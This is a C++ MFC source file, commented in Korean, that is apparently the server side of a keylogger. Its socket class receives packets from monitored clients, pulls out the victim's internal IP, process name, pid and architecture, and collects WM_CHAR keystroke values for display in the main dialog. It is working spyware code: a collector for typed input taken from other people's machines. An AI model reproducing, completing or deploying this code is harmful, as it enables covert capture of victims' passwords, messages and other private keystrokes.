#include "pch.h"
#include "resource.h"
#include "CClientSocket.h"
#include "KeyLoggerServerDlg.h"
#include "mydef.h"

CClientSocket::CClientSocket(CKeyLoggerServerDlg* dlg)
{
	m_main = dlg;
	m_pid = 0;
	m_arch = 0;
	m_status = TRUE;
}

void CClientSocket::OnReceive(int nErrorCode)
{
	// TODO: 여기에 특수화된 코드를 추가 및/또는 기본 클래스를 호출합니다.

	char buff[300];
	int len = Receive(buff, 300, 0);
	if (len == -1)
	{
		MessageBox(0, TEXT("connection down"), TEXT("error"), MB_OK | MB_ICONERROR);
		return;
	}

	/* 전송받은 패킷을 MSG객체 + 프로세스 이름(unicode) + pid + 아키텍쳐 정보로 분리 */
	
	MSG32 msg32;
	MSG64 msg64;

	if (m_arch == 0) // 처음으로 받은 패킷일때
	{
		m_arch = buff[len - 1];

		int read_len = sizeof(MSG32);
		WCHAR wc_buff[50] = L"";

		// 32비트, 64비트 따라서 MSG객체 크기가 달라짐
		if (m_arch == 0x32)
			read_len = sizeof(MSG32);
		else if (m_arch == 0x64)
			read_len = sizeof(MSG64);

		// 내부망 IP
		wcscpy_s(wc_buff, (WCHAR*)(buff + read_len));
		read_len += sizeof(WCHAR) * (wcslen(wc_buff) + 1);
		internal_IP = wc_buff;

		// 프로세스 이름
		wcscpy_s(m_processName, (WCHAR*)(buff + read_len));
		read_len += sizeof(WCHAR) * (wcslen(m_processName) + 1);

		// pid
		memcpy(&m_pid, buff + read_len, 4);

		// 메인 다이얼로그 유저 리스트 업데이트(OnAccept때 못줬던 정보 제공)
		m_main->UpdateListCtrl(-1, this);
	}

	// 아키텍쳐에 따라 메시지 객체를 다르게 줘야함
	if (m_arch == 0x32)
	{
		memcpy(&msg32, buff, sizeof(MSG32));
	
		switch (msg32.message)
		{
		case WM_CHAR:
			m_MSGList.push_back(msg32.wParam);
			break;
		}
		m_main->ReceiveMSG(&msg32, this, m_pid);
	}
	else if (m_arch == 0x64)
	{
		memcpy(&msg64, buff, sizeof(MSG64));
	
		switch (msg64.message)
		{
		case WM_CHAR:
			m_MSGList.push_back(msg64.wParam);
		}
		m_main->ReceiveMSG(&msg64, this, m_pid);
	}
	CSocket::OnReceive(nErrorCode);
}

void CClientSocket::OnClose(int nErrorCode)
{
	// TODO: 여기에 특수화된 코드를 추가 및/또는 기본 클래스를 호출합니다.

	m_status = FALSE; // 프로세스 종료 상태 설정
	m_main->ReceiveMSG((LPMSG32)NULL, this, m_pid);
	CSocket::OnClose(nErrorCode);
}
